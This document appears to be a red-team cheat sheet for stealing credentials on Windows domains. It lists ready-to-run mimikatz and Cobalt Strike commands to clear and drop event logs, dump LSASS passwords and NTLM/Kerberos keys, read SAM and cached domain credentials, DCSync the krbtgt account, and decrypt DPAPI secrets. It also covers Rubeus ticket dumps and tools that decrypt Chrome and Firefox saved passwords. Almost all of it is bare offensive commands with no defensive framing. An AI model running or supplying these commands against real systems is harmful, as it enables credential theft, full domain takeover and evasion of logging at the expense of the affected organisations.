### Cobalt Strike
logonpasswords contains msv,tspkg,wdigest,kerberos,ssp,credman,cloudap.
```powershell
mimikatz !event::clear
mimikatz !event::drop
mimikatz !sekurlsa::logonpasswords
mimikatz !sekurlsa::ekeys
mimikatz !sekurlsa::dpapi
mimikatz !sekurlsa::tickets /export
mimikatz !lsadump::sam
mimikatz !lsadump::cache
mimikatz kerberos::list /export
mimikatz kerberos::tgt

make_token marvel\administrator P@ssw0rd
mimikatz @lsadump::dcsync /user:marvel\krbtgt
mimikatz @lsadump::dcsync /domain:marvel.local /all /csv
rev2self
```

### NTLM RC4 Hash Dump
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > res1.txt
type .\res1.txt | sls 'username|password|ntlm'
```

### Kerberos AES256 Hash Dump
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit > res2.txt
type .\res2.txt | sls 'username|password|des_cbc_md4'
```

### Local Users Hash Dump (SAM)
```powershell
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit > res3.txt
type .\res3.txt | sls "user :|hash|aes256"
```

### Domain Cached Credentials
```powershell
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit
```

### Kerberos Tickets Dump
```powershell
execute-assembly /root/Rubeus.exe triage
execute-assembly /root/Rubeus.exe dump /nowrap > res4.txt
execute-assembly /root/Rubeus.exe dump /nowrap /luid:0x70331 /service:krbtgt
```

### Chrome Credentials
```powershell
https://github.com/djhohnstein/SharpChromium
SharpChromium.exe all > res.txt

https://github.com/ohyicong/decrypt-chrome-passwords
python3 .\decrypt_chrome_password.py > res.txt
```

### Firefox Credentials
```powershell
https://github.com/unode/firefox_decrypt
python3 .\firefox_decrypt.py
```

### DPAPI

#### Enum
```powershell
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
```

#### Dump encrypted credentials (pbData) and the related master key ID (guidMasterKey) 
```powershell
ls -Hidden C:\users\user2\appdata\local\microsoft\credentials\
mimikatz.exe "dpapi::cred /in:C:\users\user2\appdata\local\microsoft\credentials\DFBE70A7E5CC19A398EBF1B96859CE5D" exit > res1.txt
```

#### Get Master Key File (Encrypted)
```powershell
ls -Hidden C:\users\user2\appdata\roaming\microsoft\protect\<SID>\<MasterKey>
```

#### 1. If the key is cached in LSASS (Admin User)
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit > res2.txt
type res2.txt | sls "user name|guid|masterkey"
```

#### 2. Interact with the DC through the MS-BKRP RPC service (Domain User)
```powershell
mimikatz.exe "dpapi::masterkey /in:C:\users\user2\appdata\roaming\microsoft\protect\S-1-5-21-410602843-3916082903-3170366279-1119\7f1985f1-624d-4024-b36d-c0ca6d6b3766 /rpc" exit
```

#### Decrypting
```powershell
mimikatz.exe "dpapi::cred /in:C:\users\hassan\appdata\local\microsoft\credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:d5b953e1efc3890d63921fc7bd816a26c913dcc47df52b8e18b56a466ca0e1bd486fd6c9b93d31105af1c84ab7ceba1e00216d99e2601c058bdc6af3a00860d0" exit
```
